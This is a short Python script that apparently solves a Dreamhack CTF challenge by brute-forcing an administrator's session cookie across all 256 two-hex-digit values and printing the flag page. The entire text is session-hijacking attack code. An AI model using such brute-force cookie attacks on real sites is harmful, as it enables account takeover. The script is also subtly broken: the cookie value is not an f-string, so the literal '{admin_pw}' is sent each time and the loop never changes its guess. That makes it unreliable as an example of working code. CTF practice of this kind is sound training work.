import requests
import os

PORT = 21452
HOST = f'http://host3.dreamhack.games:{PORT}'

for c in range(0x00, 0x100):
    admin_pw = hex(c)[2:].zfill(2)
    header = {f'cookie': 'sessionid = {admin_pw}'}
    response = requests.get(
        f'{HOST}', headers=header)

    if "flag" in response.text:
        print(f'{admin_pw}: {response.text}')
        break
    else:
        print(f'{admin_pw}: Nope')
